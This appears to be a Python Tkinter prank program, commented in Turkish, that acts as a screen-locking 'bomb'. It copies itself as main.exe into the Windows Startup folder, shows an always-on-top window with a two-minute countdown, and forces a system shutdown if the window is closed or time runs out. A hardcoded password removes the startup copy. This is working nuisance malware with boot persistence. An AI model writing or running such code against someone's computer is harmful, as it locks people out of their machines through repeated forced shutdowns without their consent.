from tkinter import * # pencere kütüphanesi
import os 
import shutil
import sys

# Güncellemeler ve pip yüklemeleri
os.system("python -m pip install --upgrade pip")
os.system("pip install shutils")

# Ana patlama işlemi
def patla(event=None):
    os.system("shutdown /s")

# Hemen patlama fonksiyonu
def hemenPatla():
    os.system("shutdown /s")

# Startup'a program eklemek
kaynak_dosya = "main.exe"  # burada .exe dosyasının adını yazılması gerekiyor
hedef_klasor = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
hedef_dosya = os.path.join(hedef_klasor, "main.exe")  # Startup'a eklenecek dosya adı

shutil.copy2(kaynak_dosya, hedef_dosya)

# Zamanlayıcı ve şifre kontrolü
Time = 120  # Süre belirlendi
sifre = "1845293"  # Şifre

# Masaüstüne gitme işlemi
hedef = os.environ["USERPROFILE"]
os.chdir(hedef)

# Masaüstü klasörünü doğru bulmak
masaustu = os.path.join(hedef, "Desktop")  # İngilizce sistemler için
if not os.path.exists(masaustu):  # Türkçe sistemlerde Masaüstü
    masaustu = os.path.join(hedef, "Masaüstü")

if os.path.exists(masaustu):
    os.chdir(masaustu)
else:
    print("Masaüstü veya Desktop klasörü bulunamadı!")

# Tkinter pencere ayarları
bomba = Tk()
bomba.title('BOMBA!')
bomba.geometry("550x600")
bomba.configure(bg='#A96033')
bomba.resizable(width=False, height=False)

entryFrame = Frame(bomba, bg='#A96033')
sureFrame = Frame(bomba, bg='blue')
entryFrame.place(relx=0, rely=0.07, relwidth=1, relheight=0.1)
sureFrame.place(relx=0.4, rely=0, relwidth=0.2, relheight=0.07)

# Pencerenin kapatılması engellendi
bomba.protocol("WM_DELETE_WINDOW", False)
bomba.protocol("WM_DELETE_WINDOW", hemenPatla)
bomba.attributes("-toolwindow", 1)
bomba.attributes("-topmost", 1)

sure = Entry(sureFrame, bd=0, font='arial 30 bold', justify=CENTER)
sifreEnt = Entry(entryFrame, font='arial 36', bd=0, background='yellow', justify=CENTER)
sifreEnt.pack()
sure.pack()

# Zamanlayıcı güncelleme
def update_timer():
    global Time
    minute = Time // 60
    second = Time % 60
    timer = "{:02d}:{:02d}".format(minute, second)
    sure.delete(0, END)
    sure.insert(0, timer)
    
    if Time > 0:
        Time -= 1
        bomba.after(1000, update_timer)  # 1 saniye sonra güncelle
    else:
        bomba.destroy()
        patla()

# Şifre ve zamanlayıcı kontrolü
def bind_enter(event):
    global sifreEnt, Time
    if sifreEnt.get() == sifre:
        if os.path.exists(hedef_dosya):
            os.remove(hedef_dosya)
        bomba.destroy()
        sys.exit()
    else:
        Time -= 1
        bomba.bind('<Return>', bind_enter)

bomba.bind('<FocusIn>', bind_enter)  # Enter tuşuna basılınca bind_enter fonksiyonu devreye girer

update_timer()
bomba.mainloop()
